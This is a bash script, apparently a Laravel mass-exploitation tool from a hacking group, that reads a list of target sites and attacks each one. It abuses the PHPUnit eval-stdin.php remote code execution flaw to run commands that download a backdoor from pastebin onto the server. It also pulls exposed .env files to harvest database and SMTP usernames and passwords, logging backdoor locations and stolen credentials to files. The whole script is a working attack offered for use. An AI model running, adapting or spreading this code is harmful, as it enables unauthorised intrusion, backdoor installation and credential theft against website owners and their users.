#!/bin/bash

# Larapush v0.1
# Release on 01/04/2020
# Github: Aryaalfahrezi010/larapush
# Mr.TenAr

# color

R='\033[0;31m'
G='\e[32m'
O='\033[0;33m'
N='\033[0m'
PP='\033[95m' # purple
CY='\033[96m' # cyan
BL='\033[94m' # blue
GR='\033[92m' # green
YW='\033[93m' # yellow
RD='\033[91m' # red
NT='\033[97m'  # netral
O='\e[0m' # nothing
B='\e[5m' # blink
U='\e[4m' # underline

function header(){
        printf "${YW}
  |\___/|
  )     (   ${RD}${U}[ Laravel Exploiter ]${O}${YW}
 =\     /=
   )${PP}===${YW}(
  /     \
  |     |
 /       \
 \       /
  \__  _/
    ( (
     ) )
    (_(

+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
|       ${CY}RCE LARAVEL PHPUNIT & Get .Env
|       ${PP}Coded By : ${CY}${U}Mr.TenAr${O}${YW}
|       ${PP}Youtube : ${CY}${U} Dark Clown Security${O}${YW}
|       ${PP}My Team : ${CY}${U} Dark Clown Security${O}${YW}
|       ${PP}Github : https://github.com/Aryaalfahrezi010/larapush
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
"
}

rce(){
        c="uname -a;curl -s https://pastebin.com/raw/35ZUWkNc -o dcs.php"
        g=$(curl -s -d "<?php echo 'Cans21 :'.system('$c').':';?>" "$1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
        uname=$(echo $g | grep -oP 'Cans21 :\K[^:]+')
        if [[ ! -z $uname ]]; then
                rc="${G}RCE${N}"
                un="${G}[*] Kernel : $uname${N}${N}"
                if [[ $(curl -s $1/vendor/phpunit/phpunit/src/Util/PHP/cans.php | grep -ic "Cans21") -eq 1 ]]; then
                        shell="${G}[*] Berhasil Upload Backdoor : ${O}$1/vendor/phpunit/phpunit/src/Util/PHP/dcs.php${N}"
                        echo "$1/vendor/phpunit/phpunit/src/Util/PHP/dcs.php" >> laravel-rce-log.txt
                else
                        shell="${R}[-] Gagal Upload Backdoor${N}"
                fi
                loc="\n$un\n$shell\n"
        else
                rc="${R}RCE${N}"
        fi
}

env(){
        g=$(curl -s "$1/.env")
        db_host=$(echo $g | grep -oP 'DB_HOST=\K[^ ]+')
        db=$(echo $g | grep -oP 'DB_DATABASE=\K[^ ]+')
        db_u=$(echo $g | grep -oP 'DB_USERNAME=\K[^ ]+')
        db_p=$(echo $g | grep -oP 'DB_PASSWORD=\K[^ ]+')
        m_host=$(echo $g | grep -oP 'MAIL_HOST=\K[^ ]+')
        m_port=$(echo $g | grep -oP 'MAIL_PORT=\K[^ ]+')
        m_u=$(echo $g | grep -oP 'MAIL_USERNAME=\K[^ ]+')
        m_p=$(echo $g | grep -oP 'MAIL_PASSWORD=\K[^ ]+')

        if [[ -z $db_host ]]; then
                en="${R}DB${N}"
        else
                en="${G}DB${N}"
                dbs="${G}\n     [*] DB_HOST : $db_host\n        [*] DB_DATABASE : $db\n [*] DB_USERNAME : $db_u\n      [*] DB_PASSWORD : $db_p\n${N}"
                echo "$1 | DATABASE : $db_host | $db | $db_u | $db_p" >> laravel-env-log.txt
                if [[ -z $m_host || $m_host == "null" || $m_host == "localhost" || $m_host == "mailtrap.io" || $m_host == "smtp.mailtrap.io" ]]; then
                        sm="${R}SMTP${N}"
                else
                        sm="${G}SMTP${N}"
                        smtp="${G}\n    [*] MAIL_HOST : $m_host\n       [*] MAIL_PORT : $m_port\n       [*] MAIL_USERNAME : $m_u\n                                    [*] MAIL_PASSWORD : $m_p\n${N}"
                        echo "$1 | SMTP : $m_host | $m_port | $m_u | $m_p" >> laravel-env-log.txt
                fi
        fi

}

exploit(){
        u=$(echo $1 | grep -Po '.*?//.*?(?=/)')
        env $u && rce $u
        echo -e "[$w][$2/$tot] $1 [$en][$sm][$rc]$dbs$smtp$loc"
}

header

read -p "[?] Masukan List Target [ target.txt ] --> " l
if [[ ! -f $l ]]; then
        echo "[-] File $l Not Exist!"
        exit 1
fi

read -p "[?] Threads (Default 10) --> " t
if [[ $t="" ]]; then
        t=10;
fi

read -p "[?] Menunda (Default 1) --> " s
if [[ $s="" ]]; then
        s=1;
fi

echo
echo -e "[!] ${G}Muatan Target --> ${O}$(wc -l $l)${N}"
echo -e "[!] ${G}Thread --> ${O}$t${N}"
echo -e "[!] ${G}Menunda --> ${O}$s sec${N}"
echo -e "[+] ${G}Mulai Ekploitasi pada system laravel.......${N}"
echo -e "[+] ${G}...........BINGO!!!!\n"

n=1
IFS=$'\r\n'
for i in $(cat $l); do
        f=$(expr $n % $t)
        if [[ $f == 0 && $n > 0 ]]; then
                sleep $s
        fi
        w=$(date '+%H:%M:%S')
        tot=$(cat $l | wc -l)
        exploit $i $n &
        n=$[$n+1]
done
wait
